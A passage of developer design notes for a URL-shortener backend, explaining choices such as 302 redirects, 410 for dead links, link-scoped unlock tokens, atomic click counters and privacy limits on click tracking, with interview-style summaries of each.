**Production considerations.** Being the hottest, most public path in the
system is exactly why Phase 8 and Phases 10-11 (caching, background click
recording, rate limiting) all target this route specifically, in that
order — each
addresses a different cost that only shows up at real traffic volume:
repeated identical lookups, synchronous write latency, and abuse/DoS
exposure from having no auth gate at all.

**Interview answer.** The redirect route has no authentication and no
per-user scoping because it's the one endpoint in the API meant for the
general public, not an authenticated owner — `getLinkByShortCode` is
deliberately the only lookup in `linkService.ts` without a `user_id`
clause, since there's no logged-in user to scope against. That's also
why it's the highest-traffic route in the system and the target of every
later hardening phase — caching, moving click-recording off the request
path, and rate limiting all exist because this route can't lean on "only
an authenticated owner can even reach this" the way every other route
in the app does.

---

### 301 vs. 302 vs. 307/308 — the caching trap

**What it is.** HTTP defines several redirect status codes that differ in
two independent dimensions: whether the redirect is _permanent_ (301, 308) or _temporary_ (302, 307), and whether the client is required to
preserve the original request method/body (307, 308) or allowed to
switch to GET (301, 302 — in practice, universally switched to GET by
real browsers regardless of what the spec technically permits).

**Why it exists in this project.** `res.redirect(302, link.destinationUrl)`
in `src/routes/redirect.ts` uses 302, not 301, and the difference is not
cosmetic. Browsers are permitted — and in practice do — cache a 301
response aggressively and indefinitely, often without ever re-checking
with the server again for that exact URL. A 302 is documented as
non-cacheable by default.

**How it works mechanically.** Every state check this route performs —
`is_active`, `expires_at`, `max_clicks` vs. `click_count`, the password
gate — runs on _every single request_, because nothing about a 302
tells the browser it may skip asking the server next time. Click
recording (`recordClick`) likewise runs on every request. If this route
returned 301 instead, the first browser to follow a given short link
would cache "`/abc1234` → `https://real-destination.com`" locally and,
for that browser, never issue another request to `/abc1234` again — not
tomorrow, not after the link is deactivated, not after its
`destinationUrl` is edited via `PATCH /api/links/:id`, not after it
expires or hits its click limit. The browser already has what it thinks
is the permanent answer and has no reason to ask again. Concretely, this
means: click counts silently stop incrementing for that visitor forever;
`is_active: false` and `expires_at` become unenforceable for anyone who
already clicked once; a password gate added _after_ someone already
unlocked-and-cached a 301 response is simply bypassed on every future
click; and editing `destinationUrl` has no effect for that visitor. The
link _looks_ like it's working — the visitor's browser still lands
somewhere — while every dynamic feature of the system silently stops
applying to that specific visitor, and there is no way to reverse it
server-side: a cache the server never sees again cannot be busted by
anything the server does.

**Where it lives in the codebase.** `src/routes/redirect.ts`, the
`res.redirect(302, link.destinationUrl)` call.

**Common pitfalls.**

- Using 301 for "it's simpler" or "it's marginally faster for the
  visitor" — the performance argument is real (one fewer round trip on
  repeat visits) but it trades away every piece of server-side control
  this phase just built, permanently, for whichever browsers happen to
  cache it.
- Assuming 307/308 are safer defaults because they're "newer" — they
  solve a completely different problem (preserving method/body across
  the redirect, relevant for redirecting a POST/PUT), not the caching
  question. 307 shares 302's non-cached-by-default behavior and would
  work here, but a GET-only redirect target has no method/body to
  preserve, so 302 is the simpler, purpose-fit choice — 307 adds no
  benefit for this route.

**Production considerations.** Some URL shorteners intentionally use 301
for search-engine-facing reasons (SEO tools sometimes prefer permanent
redirects) or to shave latency at massive scale by leaning on CDN/browser
caching instead of hitting origin — but that tradeoff only makes sense
once click tracking, expiry, and password gating are either not needed
or handled entirely at the edge (e.g., a CDN that can independently
invalidate its own cache). Given this project's whole premise is
per-click tracking and dynamic link state, that tradeoff doesn't apply
here.

**Interview answer.** I used 302, not 301, because the browser caching
behavior isn't a performance detail — it's irreversible. A 301 gets
cached by the browser, often indefinitely, so a visitor who's clicked a
link once may never send another request to this server for that link
again, silently freezing click counts, expiry enforcement, password
gating, and destination edits for that visitor specifically, with no
server-side way to invalidate a cache it can't see. 302 (or 307, which
differs only in method/body preservation, irrelevant for a GET-only
redirect) tells the browser explicitly not to cache, so every click
actually reaches the server and gets evaluated against current link
state.

---

### Route ordering and wildcard shadowing, tied to reserved words

**What it is.** Continued from Phase 6's "Reserved words and route
shadowing" section — this is where that anticipated problem actually
gets solved, now that `redirectRouter` exists.

**Why it exists in this project.** `redirectRouter`'s `GET /:shortCode`
is a single-segment wildcard: Express (via path-to-regexp) matches
`:shortCode` against exactly one path segment, never spanning a `/`. That
means it can only ever collide with other _single-segment_ routes —
`/health` today, a bare `/api` if ever requested with nothing after it —
and never with multi-segment routes like `/api/auth/login` or
`/api/links/:id`, which always win on their own more specific prefix
match regardless of where `redirectRouter` is mounted.

**How it works mechanically.** Two independent layers protect against
this, and they protect against different failure modes:

1. **Write-time (Phase 6):** `RESERVED_SHORT_CODES` in
   `src/lib/shortCode.ts` stops anyone from ever _creating_ a link whose
   short code is `health`, `api`, `auth`, etc. — `customAliasSchema`'s
   `.refine()` rejects it with 400 before the row can exist.
2. **Runtime (this phase):** `src/app.ts` mounts `app.use(redirectRouter)`
   _after_ `rootRouter`, `healthRouter`, `/api/auth`, and `/api/links` —
   and before the catch-all 404. Express matches middleware/routes in
   registration order and stops at the first match, so `/health` is
   handled by the real `healthRouter` before `redirectRouter` ever sees
   the request, regardless of what row (if any) exists at `short_code =
'health'`.

The second layer matters even though the first, in isolation, already
guarantees no such row can exist — because the two layers guard against
different failures. Layer 1 is a guarantee about _data_: no row can ever
impersonate a real path. Layer 2 is a guarantee about _request handling_:
even if that data guarantee were ever violated (a bug in the `.refine()`,
a direct DB write bypassing the API, a future reserved word added after
existing links were created), correct mount order still means the
`/health` _request_ reaches the real health check first — `redirectRouter`
would simply never be consulted for that literal path. Relying on either
layer alone leaves a gap; both together close it from two independent
directions.

**Where it lives in the codebase.** `src/app.ts` (mount order and the
comment explaining it); `src/lib/shortCode.ts` (`RESERVED_SHORT_CODES`,
carried over from Phase 6).

**Common pitfalls.**

- Mounting `redirectRouter` early "since it's simple" or alongside
  `rootRouter` — the _content_ of the route doesn't change based on
  mount position, but _which requests it ever gets a chance to handle_
  does. A route mounted first always wins ties against a route mounted
  later, for any request shape both could match.
- Believing the reserved-word list alone is sufficient and skipping the
  mount-order reasoning — as explained above, the two guarantees cover
  different failure modes; dropping either one narrows, but doesn't
  eliminate, the shadowing risk.

**Production considerations.** At a much larger route surface, manually
keeping `RESERVED_SHORT_CODES` and "mount the wildcard route last" in
sync by hand becomes more error-prone — Phase 6 already noted deriving
the reserved list programmatically from the router's own registered
top-level paths as the scalable alternative; the same observation applies
here; mount order itself, however, has no equivalent shortcut — a
wildcard route being last is a structural property of the app, not
something that can be derived from data.

**Interview answer.** `/:shortCode` only matches a single path segment,
so it can only ever collide with other single-segment routes like
`/health` — never with `/api/auth/*` or `/api/links/*`, which always win
on their own more specific prefix regardless of mount order. Two
independent layers guard the single-segment case: `RESERVED_SHORT_CODES`
stops a link from ever being _created_ at a real path like `health`
(a write-time guarantee), and mounting the redirect router last in
`src/app.ts` means the real `/health` handler always gets first refusal
on that literal request (a runtime guarantee). I keep both because they
protect against different failures — one about what data can exist, the
other about which handler a given request actually reaches — and either
one alone leaves a gap the other closes.

---

### 404 vs. 410 for deliberately-ended resources

**What it is.** RFC 9110 §15.5.9 defines 410 Gone as "the target resource
is no longer available... this condition is considered to be permanent,"
distinct from 404's "the origin server did not find a current
representation... or is not willing to disclose that one exists."

**Why it exists in this project.** `src/routes/redirect.ts`'s
`deadStateError` returns 410 for three cases: `is_active: false`,
`expires_at` in the past, and `click_count >= max_clicks`. All three
describe a link the server _knows about_ and is _declining to serve on
purpose_ — a materially different claim than "no idea what this could
ever refer to," which is what a genuinely nonexistent short code (still 404) means.

**How it works mechanically.** `deadStateError` in `src/routes/redirect.ts`
checks all three conditions, in order, against the row `getLinkByShortCode`
returns, and is shared between `GET /:shortCode` and `POST
/:shortCode/unlock` so both agree on what "dead" means without
duplicating the logic. `gone()` in `src/lib/errors.ts` is a new factory
alongside the existing `notFound`/`conflict`/etc., producing `{ statusCode:
410, code: 'GONE' }` through the same centralized error-formatting
middleware every other error already uses.

**Where it lives in the codebase.** `src/lib/errors.ts` (`gone()`,
the `'GONE'` `ErrorCode`); `src/routes/redirect.ts` (`deadStateError`).

**Common pitfalls.**

- Treating "technically reversible via `PATCH`" as disqualifying 410 —
  it doesn't. RFC 9110 doesn't require true permanence, only that the
  server isn't obligated to imply the resource might return; an owner
  flipping `isActive` back to `true`, raising `maxClicks`, or extending
  `expiresAt` doesn't retroactively make 404 the more accurate status
  for the moment the request was actually rejected.
- Splitting `is_active: false` into its own 404 case while treating
  expiry/click-limit as 410 — all three are the same class of outcome
  ("this used to resolve, doesn't right now, on purpose"), and treating
  them identically at the status-code level is more useful to API
  consumers than an inconsistency with no real semantic basis.

**Production considerations.** Some link-shortener APIs distinguish
further — e.g., a distinct code or `details` payload for "deactivated by
owner" vs. "expired" vs. "click limit reached" — useful if a frontend
wants to show a different message per cause. This project's `gone()`
calls already pass a cause-specific `message` (`details` in the AppError
shape), so that distinction exists in the response body without needing
three different HTTP status codes for it.

**Interview answer.** 404 means the server has no idea what a URI could
ever refer to; 410 means the server knows exactly what it was and is
declining to serve it on purpose — which is the case for a deactivated,
expired, or click-exhausted link, since `getLinkByShortCode` found a real
row and evaluated real state to reject it. I treat all three "dead"
states identically as 410, including `is_active: false`, even though all
three are technically reversible via a later `PATCH` — RFC 9110 doesn't
require true permanence for 410, and splitting one of the three cases
into 404 for no reason beyond that reversibility would be an
inconsistency with no real semantic basis.

---

### Lazy vs. scheduled expiry

**What it is.** Lazy expiry checks whether something has expired only
when it's actually read/used, doing nothing until then. Scheduled expiry
runs a separate process on a timer that proactively finds and handles
expired rows regardless of whether anyone reads them.

**Why it exists in this project.** `deadStateError` in
`src/routes/redirect.ts` is lazy-only, by design, for this phase: it
compares `expires_at`/`click_count` against the current time/limit _at
request time_ and returns 410 if they've passed, but never `UPDATE`s or
`DELETE`s the row to reflect that. An expired link's row looks identical
in the database the instant after it expires and a year later — nothing
proactively marks it.

**How it works mechanically.** Every dead-state check in this phase is a
pure read: `deadStateError` computes a boolean from data already fetched
by `getLinkByShortCode` and either throws or doesn't — no write happens
as a side effect of discovering expiry. This is a deliberate scope
boundary for Phase 7 (per the task brief driving this phase): "lazy
expiry only... Phase 9 adds the sweep."

**Where it lives in the codebase.** `src/routes/redirect.ts`
(`deadStateError`'s read-only checks).

**Common pitfalls.**

- Assuming lazy expiry alone is sufficient in production — it only
  closes the gap for rows someone actually requests. An expired link
  nobody ever clicks again sits in the table forever, invisibly, taking
  up storage and (once Phase 11's indexing pass adds the partial
  `expires_at` index) still costing index maintenance on every write to
  a table that's silently accumulating dead weight.
- Assuming a scheduled sweep alone is sufficient — between sweep runs,
  a link can be technically expired but still lazily unaware of it until
  the next sweep tick if nothing else checks in between. Lazy expiry is
  what closes _that_ gap: correctness the instant a request arrives,
  not just eventually on the sweep's schedule.

**Production considerations.** This is exactly why production systems
that expire things at scale (session stores, cache entries, this table
eventually) tend to run both mechanisms together: lazy expiry gives
immediate, per-request correctness with zero extra infrastructure;
scheduled expiry (a sweep job, Phase 9 here) reclaims storage and index
space from rows nobody's requesting, and stops every future read from
repeatedly re-evaluating a row that's provably, permanently dead. Running
only one leaves either a correctness gap (scheduled-only, between sweeps)
or a storage/cost gap (lazy-only, forever) that the other closes.

**Interview answer.** This phase only implements lazy expiry: `is_active`,
`expires_at`, and `click_count` vs. `max_clicks` are checked at read
time, and an expired row is never written to or deleted as a result —
that's Phase 9's sweep job. Lazy expiry alone gives immediate,
per-request correctness for free, but leaves expired rows accumulating
in the table forever since nothing proactively cleans them up; a
scheduled sweep alone would leave a correctness gap between runs. That's
why production systems that expire things at real scale usually run
both — lazy for instant correctness, scheduled to reclaim storage and
stop repeatedly re-evaluating rows that are already known to be dead.

---

### Per-link passwords as a distinct auth problem from user sessions

**What it is.** `tokenService.ts`'s JWTs (`TokenPayload { sub, iat, exp }`)
authenticate a _user_ of Click Scope — someone with a row in `users`,
logging in to manage their own links. A password on an individual link
authenticates a _visitor's knowledge of that one link's password_ — an
entirely different subject, with no user row behind it at all.

**Why it exists in this project.** A visitor unlocking a
password-protected link is, by definition, someone reachable through
`redirectRouter` — the unauthenticated, public route. They may not have
a Click Scope account at all. Reusing `tokenService.signToken(userId)`
here would require inventing a fake `userId` to put in `sub`, or
stretching `sub`'s meaning to sometimes mean "a link id instead of a
user id" — either one is a category error: `sub` in every other part of
this codebase means exactly one thing (a row in `users`), and quietly
overloading it here would make every future piece of code that reads a
token's `sub` unable to assume that anymore.

**How it works mechanically.** `src/services/unlockTokenService.ts` is a
separate, small module — `signUnlockToken(linkId)` /
`verifyUnlockToken(token)` — with its own payload shape (`{ linkId, typ:
'link_unlock' }`, no `sub`) and its own lifetime (`UNLOCK_TOKEN_TTL =
'30m'`, vs. `tokenService`'s 7-day default). It reuses
`config.JWT_SECRET` rather than adding a second secret (see "Scoped,
short-lived grants" below for why that's still safe), but the `typ`
discriminator keeps the two token _shapes_ non-interchangeable — a real
user session token has no `linkId`/`typ` claim, so `verifyUnlockToken`
rejects it even though `jwt.verify()` would happily validate its
signature.

**Where it lives in the codebase.** `src/services/unlockTokenService.ts`
(new, separate from `src/services/tokenService.ts`).

**Common pitfalls.**

- Reaching for `requireAuth`/`tokenService` "since it's already there" —
  it would silently require every link-unlocker to have a Click Scope
  account, which breaks the entire feature for anonymous visitors, who
  are the overwhelming majority of people who'll ever see this
  interstitial.
- Putting `linkId` in a real session token's payload instead of building
  a separate token type — even if it "worked" mechanically, it would mean
  `tokenService.verifyToken`'s callers (i.e., `requireAuth`) now need to
  know about a claim that only makes sense for a completely different,
  unrelated flow.

**Production considerations.** If link-unlock grants ever needed to be
independently revocable without touching real user sessions (e.g., "log
this visitor out of every link they've unlocked" as a feature), a
denylist or a per-link version counter checked at `verifyUnlockToken`
time would be the next step — not built here, since nothing in this
phase needs unlock grants to be revocable before their 30-minute expiry
anyway.

**Interview answer.** I built a separate token service for link unlocks
rather than reusing the user-session JWTs from Phase 4, because the
subject is fundamentally different — a visitor proving they know one
link's password isn't a user of Click Scope and may have no account at
all, so there's no `users` row to put in a session token's `sub` claim.
The unlock token has its own payload shape (`linkId`, not `sub`), its
own short lifetime (30 minutes vs. 7 days), and a `typ` discriminator
that keeps it structurally rejected by anything expecting a real session
token, even though both happen to share a signing secret.

---

### Scoped, short-lived grants

**What it is.** A "scoped" grant proves authorization for one specific
resource, not a category of resources — the opposite of a session token
that, once valid, is valid for everything a user account can do.

**Why it exists in this project.** Unlocking link A must never grant
access to link B, even though both are protected by the same mechanism
and, in this project, the same JWT secret. That's the CRITICAL
requirement this phase names explicitly, and it's what
`unlockTokenService.signUnlockToken(linkId)` and the caller-side check in
`src/routes/redirect.ts` are built specifically to guarantee.

**How it works mechanically.** Two layers, doing two different jobs:

1. **Cookie naming** — `link_unlock_<shortCode>`, plus `path:
/${shortCode}` on the cookie itself — means a browser won't even
   _attach_ link A's cookie to a request for link B under normal
   operation. This is a convenience/defense-in-depth layer, not the
   actual security boundary: it's just a naming convention a client could
   ignore or a request could be crafted to bypass.
2. **Payload comparison** — `verified.linkId !== link.id` in
   `redirectRouter`'s `GET /:shortCode` handler — is the real
   enforcement. Even if a cookie named `link_unlock_<shortCodeB>` somehow
   arrived carrying link A's signed token (exactly what
   `tests/routes/redirect.test.ts`'s "CRITICAL" test forges and sends),
   `verifyUnlockToken` still returns link A's real id, and the equality
   check against link B's actual id fails — the interstitial is served
   again, not a redirect.

The grant names the specific link _inside the signed payload_, not just
in an external convention like a cookie name, precisely so that the
enforcement doesn't depend on any client behaving cooperatively.

**Where it lives in the codebase.**
`src/services/unlockTokenService.ts` (`signUnlockToken`,
`verifyUnlockToken`); `src/routes/redirect.ts` (`cookieNameFor`, the
`verified.linkId !== link.id` check); the "CRITICAL" test in
`tests/routes/redirect.test.ts`.

**Common pitfalls.**

- Relying on cookie-name scoping alone and skipping the payload
  comparison — this is exactly the bug the CRITICAL test is designed to
  catch: a forged or misdirected cookie with the _right name_ but the
  _wrong linkId inside it_ would silently succeed without the equality
  check.
- A grant that names "a link was unlocked" (a boolean) instead of _which_
  link — the CRITICAL requirement is unenforceable without the specific
  id being part of what's verified, since there'd be nothing to compare
  against.

**Production considerations.** The 30-minute expiry is a judgment call,
not a load-bearing security boundary the way a user session's expiry is
— it exists so a stale grant doesn't linger indefinitely in a visitor's
browser, not to defend against a sophisticated attacker (bcrypt already
handles the actual password-guessing resistance, rate limiting on
`/unlock` is the still-open gap noted below).

**Interview answer.** The unlock grant is scoped by embedding the link's
real database id inside the signed JWT payload and comparing it against
the actually-requested link's id on every subsequent request — that
comparison in `src/routes/redirect.ts` is the real enforcement. The
per-link cookie name is a second, independent layer that stops a browser
from even sending the wrong cookie under normal use, but it's not what
actually prevents the attack; I wrote a test that forges a
correctly-named cookie carrying a _different_ link's signed token
specifically to prove the payload check, not the naming convention, is
what closes the gap.

---

### Denormalized counters

**What it is.** A denormalized counter is a value stored redundantly
alongside data it could otherwise be computed from on demand — trading
storage and write-time complexity for cheap, O(1) reads instead of
recomputing an aggregate every time it's needed.

**Why it exists in this project.** `links.click_count` could, in
principle, always be derived as `SELECT COUNT(*) FROM clicks WHERE
link_id = $1` — `clicks` already has every row needed to compute it.
Maintaining `click_count` as its own column exists so that every
`deadStateError` check (`click_count >= max_clicks`) and every list/get
response doesn't have to run a `COUNT(*)` over a table that will, at real
scale, be far larger than `links` itself — one row per link vs. one row
per click, potentially thousands of clicks per popular link.

**How it works mechanically.** `clickService.recordClick` writes both:
one `INSERT` into `clicks` (the detailed, append-only record — one row
per click, with `referrer`/`user_agent`) and one `UPDATE links SET
click_count = click_count + 1` (the maintained aggregate). `clicks`
remains the source of truth; `click_count` is a cache of one aggregate
over it, kept in sync by every write path that adds a click.

**Where it lives in the codebase.**
`migrations/20260810111606896_create-links-table.ts` (`click_count`
column, with its non-negative check constraint);
`migrations/20260810111607018_create-clicks-table.ts` (`clicks`, the
source of truth); `src/services/clickService.ts` (`recordClick`, the one
function that writes both).

**Common pitfalls.**

- Forgetting that a denormalized value needs _every_ write path that
  affects the underlying data to also update it — `recordClick` is
  currently the only place clicks are recorded, so this isn't an issue
  yet, but a future feature that inserts into `clicks` through any other
  path (a bulk import, an admin tool) would need to remember to also
  update `click_count`, or the two would silently drift.
- Treating the denormalized counter as more authoritative than the table
  it's derived from — `clicks` is the source of truth; `click_count`
  is a read-path optimization over it, not the other way around. This
  ordering matters directly for the transaction decision below.

**Production considerations.** At the scale where `COUNT(*)` on `clicks`
becomes genuinely too slow for a hot read path, denormalization is the
standard answer — the alternative, a materialized view or a periodic
recomputation job, trades staleness for not having to keep a counter
manually in sync on every write; not needed here since `recordClick`
already keeps both in sync inline on every click.

**Interview answer.** `click_count` exists purely as a read-path
optimization — `clicks` already has everything needed to compute it via
`COUNT(*)`, but that gets expensive at scale since `clicks` will have far
more rows than `links`. `clicks` stays the source of truth; `click_count`
is a maintained cache over it, updated by the one write path
(`recordClick`) that adds a click. That ordering — cache vs. source of
truth — is exactly what let me reason clearly about how much consistency
between the two actually matters when deciding whether to wrap their
writes in a transaction.

---

### Atomic increments vs. read-then-write, and the lost-update race

**What it is.** A "lost update" is a race condition where two concurrent
operations each read the same starting value, then each independently
write back their own "value + 1" — and because both reads happened
before either write, one of the two increments is silently overwritten
and never reflected in the final value.

**Why it exists in this project.** Every click to a popular link is, by
definition, a concurrent write to the same row's `click_count`. A naive
implementation — `SELECT click_count FROM links WHERE id = $1` in
application code, add 1 in JavaScript, then `UPDATE links SET click_count
= $2` — is exactly the shape of the race: two requests arriving close
together can both read `click_count = 5` before either writes back `6`,
and the final stored value is `6`, not `7`, even though two clicks
happened.

**How it works mechanically.** `clickService.recordClick` never reads
`click_count` into application memory at all — `UPDATE links SET
click_count = click_count + 1 WHERE id = $1` computes the increment
entirely inside Postgres, as part of a single statement. Postgres
executes that statement atomically per row: a second concurrent `UPDATE`
targeting the same row either waits for the first to complete (under
MVCC's row-level locking) or operates on the post-first-update value —
there is no window where two concurrent increments can both read the
same pre-increment value, because neither one ever reads it into
anywhere a race could occur. This holds regardless of whether the
statement runs inside an explicit multi-statement transaction or on its
own — the atomicity is a property of the single `UPDATE`, not of any
wrapping around it.

**Where it lives in the codebase.** `src/services/clickService.ts`
(`recordClick`'s `UPDATE ... SET click_count = click_count + 1`); the
concurrency test in `tests/routes/redirect.test.ts` ("concurrent
redirects to the same link do not lose clicks"), which fires 20 parallel
requests and asserts the final count is exactly 20 — a test that would
fail under a naive read-then-write implementation but passes here.

**Common pitfalls.**

- Reading a counter into application code "just to log it" or "to decide
  whether to also check max_clicks" and then writing back
  `count + 1` from that same read — even if the read is only used for a
  side purpose, writing back a value derived from it reintroduces the
  exact race, regardless of intent.
- Assuming an explicit transaction is what prevents the lost-update race
  here — it isn't; the single computed `UPDATE` is what prevents it,
  independent of transactional wrapping. This distinction is what the
  next section's benchmark decision turns on.

**Production considerations.** This pattern — `column = column + 1`
computed server-side — generalizes to any counter under concurrent
writes (rate-limit counters, inventory counts, view counters); the
general fix is always "let the database compute the delta," never "read,
modify, write" from application code, regardless of the specific ORM or
query builder in use.

**Interview answer.** The lost-update race happens when two concurrent
requests both read the same counter value before either writes back an
incremented one, so one increment is silently lost — exactly what would
happen with `SELECT click_count`, add 1 in JavaScript, `UPDATE`. I avoid
it entirely by never reading the counter into application code: `UPDATE
links SET click_count = click_count + 1` computes the increment inside a
single Postgres statement, which executes atomically per row under
MVCC. I proved this concretely with a test that fires 20 concurrent
redirects at the same link and asserts the final count is exactly 20 —
it would fail under a naive read-then-write and passes here.

---

### Synchronous side effects on a latency-critical path

**What it is.** A "synchronous side effect" here means the redirect
response doesn't get sent to the visitor until the click-recording writes
have actually completed — the opposite of firing them off and responding
immediately without waiting.

**Why it exists in this project — deliberately, for now.** This phase
keeps click recording synchronous on purpose, specifically so its real
cost can be measured before Phase 9 moves it onto a queue (BullMQ,
added as a dependency in that phase). Optimizing before measuring would
mean never actually knowing whether the queue made a meaningful
difference.

**How it works mechanically, and what the measurement showed.**
`src/routes/redirect.ts`'s `GET /:shortCode` handler times the
`recordClick` call specifically (`process.hrtime.bigint()` before/after,
logged via `req.log.info({ durationMs }, 'Click recorded')`) — separate
from `requestContext.ts`'s whole-request timing, because isolating the
DB-write cost specifically is what Phase 9's comparison actually needs,
not overall request latency (which also includes routing, cookie
parsing, and the link lookup).

Before settling on `clickService.recordClick`'s final shape, two versions
were benchmarked head-to-head against the same local Postgres instance,
300 iterations each after a warm-up: the two writes (`INSERT` into
`clicks`, `UPDATE` on `click_count`) issued as plain, independent calls
through `query()`, versus the same two writes wrapped in an explicit
`BEGIN`/`COMMIT` transaction on one dedicated connection. Median latency:
**~0.5ms non-transactional vs. ~0.75ms transactional** — the
transactional version cost roughly 1.5x as long, consistent with paying
for two extra network round trips (`BEGIN`, `COMMIT`) on top of the same
two statements.

That overhead bought exactly one thing: `clicks` and `click_count` never
disagreeing even if the process crashes in the gap between the `INSERT`
resolving and the `UPDATE` being issued. It did **not** buy the
"no lost updates under concurrency" guarantee — as the previous section
covers, that's already fully guaranteed by the single computed `UPDATE`
statement, with or without a wrapping transaction; the concurrency test
passes either way. And per "Denormalized counters" above, `clicks` is
already the source of truth, `click_count` a read-path cache over it —
the `INSERT` always runs first, so the only possible drift from skipping
the transaction is `click_count` under-counting by however many clicks
were physically mid-flight at the exact instant of a crash (over-counting
isn't possible, since an `UPDATE` never fires without its `INSERT`
already having committed). That's a narrow, self-limiting, low-severity
risk — a rare crash causing a rare, small, one-directional undercount of
a display counter with no reconciliation job to matter to even in Phase 9
— traded against a consistent ~50% latency tax on the single hottest
path in the entire system, which locally is sub-millisecond but would
scale with real network round-trip time to a production database, not
shrink.

Given that, `recordClick` ships as the plain two-write version — no
transaction. The `withTransaction` helper built to run the benchmark was
removed from `src/db/pool.ts` afterward rather than left in as unused
infrastructure, since nothing in this codebase currently calls it; the
exact pattern (a dedicated `pool.connect()` client, `BEGIN`/try/`COMMIT`/
catch-`ROLLBACK`/finally-`release`) is what to reach for if a future
phase adds a write that genuinely needs multi-statement atomicity —
e.g., anything where `click_count` (or an equivalent) becomes a hard
security or billing boundary rather than a display counter, which would
flip this cost/benefit calculation.

**Where it lives in the codebase.** `src/services/clickService.ts`
(`recordClick`, with the reasoning inline); `src/routes/redirect.ts`
(the `durationMs` timing/logging around the `recordClick` call).

**Common pitfalls.**

- Reaching for a transaction by default whenever two related writes
  happen together, without asking what specific guarantee it adds beyond
  what a single atomic statement (or the actual consistency
  requirements) already provides — "two writes that are related" is not
  automatically "two writes that need ACID atomicity together."
- Benchmarking on localhost and assuming the _relative_ cost transfers
  unchanged to production — the ratio (roughly 2x round trips for the
  transactional version: `BEGIN`+`INSERT`+`UPDATE`+`COMMIT` vs.
  `INSERT`+`UPDATE`) is what should transfer; the _absolute_ added
  latency should be expected to grow, not shrink, once real network RTT
  to a production database (e.g., via Supabase's Supavisor pooler) replaces
  near-zero local loopback latency.

**Production considerations.** This decision is explicitly revisitable:
if `click_count` (or a similar counter) is ever used for something where
a rare, small undercount is unacceptable — billing, a hard usage cap
enforced as a security boundary rather than a courtesy limit — the
transactional version is a known, already-benchmarked option to fall
back to, at a known, already-measured cost.

**Interview answer.** I kept click recording synchronous this phase
specifically to measure its real cost before Phase 9 moves it to a
queue — a representative synchronous redirect, including the click
write, ran in the single-digit milliseconds locally, with the write
itself the dominant cost. I also benchmarked wrapping the two writes
(insert + counter update) in an explicit transaction versus not, and
found the transactional version cost about 1.5x as long — roughly two
extra network round trips for `BEGIN`/`COMMIT`. I chose not to keep the
transaction: the "no lost updates" guarantee people usually reach for a
transaction to get is already fully provided by the single atomic
`UPDATE click_count = click_count + 1` regardless of transactional
wrapping, so the only thing the transaction actually bought was
protection against a rare crash landing in a sub-millisecond gap between
two statements, causing at most a small, one-directional undercount of a
denormalized display counter that already isn't the source of truth.
That felt like the wrong trade on the hottest path in the whole system,
especially on the exact metric this phase exists to establish a baseline
for.

---

### Why not `cookie-parser`

**What it is.** `cookie-parser` is a widely-used Express middleware that
parses the `Cookie` request header into `req.cookies` (and, with a
secret, `req.signedCookies`), and can help construct `Set-Cookie` values.

**Why it wasn't added.** Two things this phase needs from cookies —
setting one, and reading one specific, known-named one back — need
either nothing or a few lines, respectively. `res.cookie(...)` is built
into Express itself; no middleware is required to _set_ a cookie, only
to parse incoming ones. And the unlock grant is already a signed JWT
(`unlockTokenService.ts`) — tamper-evidence is already handled there, so
`cookie-parser`'s own signed-cookie feature would be a second, redundant
signing mechanism layered on top of the first.

**How it works mechanically.** `src/lib/cookies.ts`'s `readCookie(header,
name)` splits the raw `Cookie` header on `;`, finds the segment whose
name matches, and returns its decoded value — a handful of lines that
cover exactly the one thing this phase needs (look up one named cookie),
without pulling in `cookie-parser`'s broader feature set: parsing _every_
cookie into `req.cookies` regardless of whether anything reads it, JSON
cookie support, and its own independent signing scheme.

**Where it lives in the codebase.** `src/lib/cookies.ts` (`readCookie`);
`src/routes/redirect.ts` (`res.cookie(...)` to set, `readCookie` to
read back).

**Common pitfalls.**

- Adding a well-known middleware reflexively because "that's what you use
  for cookies in Express" without checking what this specific use case
  actually needs — CLAUDE.md's "never add a dependency silently, name it,
  justify it, note the alternative" applies just as much to a _decision
  not to add one_, which is why this section exists.
- Hand-rolling cookie _signing_ as well as parsing — not needed here,
  since the unlock token is already a signed JWT; a hand-rolled signing
  scheme on top would be actively worse than either using
  `cookie-parser`'s signing or (as done here) not needing cookie-level
  signing at all.

**Production considerations.** If a future phase needs to read many
different, dynamically-named cookies, or JSON-valued cookies, or several
independently-signed ones, `cookie-parser` (or an equivalent) becomes the
right call at that point — this isn't "cookie-parser is bad," it's "this
phase's actual requirement doesn't need it yet."

**Interview answer.** I didn't add `cookie-parser` because the two things
this phase needs from cookies don't require it: setting one is built
into Express (`res.cookie`, no middleware needed), and reading back one
specific, known cookie name is a short loop over the raw header. The
unlock token is already a signed JWT, so `cookie-parser`'s signed-cookie
feature would just be a second, redundant signing layer on top of the
first. I'd reach for it if a future feature needed to parse many
different or dynamically-named cookies, but that's not what this phase
does.

---

### Privacy considerations of click tracking

**What it is.** Every click records `referrer` and `user_agent` alongside
the link it belongs to — data that, even without a user account attached
to it, can be used to fingerprint or profile a visitor across clicks.

**Why it exists in this project.** `referrer` and `user_agent` are the
two pieces of context Phase 7's spec calls for capturing per click, and
they're genuinely useful for the analytics this project is building
toward — knowing where clicks come from and what device/browser clicked
is standard link-analytics functionality. But capturing them isn't
free of privacy considerations just because no login is involved.

**How it works mechanically.** `clickService.recordClick` reads
`req.header('referer')` (the HTTP header's actual, historically-misspelled
name — this project's own column is spelled correctly, `referrer`) and
`req.header('user-agent')`, both nullable — a request through most
browsers' privacy modes, or with `Referrer-Policy` restricting outbound
referrers, may send neither, and both are stored as `NULL` rather than
erroring. Notably, **no IP address is captured or stored anywhere in this
schema** — `clicks` has a `country` column (nullable, presumably meant to
be resolved from a request's IP by some future geolocation step) but no
`ip_address` column at all, so a raw IP is never persisted even
transiently by the code in this phase.

**Where it lives in the codebase.**
`migrations/20260810111607018_create-clicks-table.ts` (`referrer`,
`user_agent`, `country` columns — no IP column);
`src/services/clickService.ts` (what's actually read from the request and
stored).

**Common pitfalls.**

- Treating "no user account" as equivalent to "no privacy
  consideration" — `user_agent` combined with `referrer` and click
  timing can still meaningfully fingerprint a device/browser across
  multiple clicks on links from the same short-code owner, even with zero
  identifying account data attached.
- Assuming `country` being nullable-and-unpopulated in this phase means
  no location signal exists at all — the column's presence signals an
  intent to resolve it from IP later; whatever mechanism eventually
  populates it will need its own privacy reasoning about IP handling at
  that point, not just at storage time.

**Production considerations, deliberately not built in this phase:**

- **Retention limits.** Nothing in this schema or this phase deletes old
  `clicks` rows — a production system handling real traffic would need
  an explicit retention/TTL policy, not indefinite accumulation.
- **Consent.** No consent banner or opt-out mechanism exists for EU (or
  other jurisdiction) visitors; a production deployment serving such
  visitors would need one before recording `referrer`/`user_agent` at
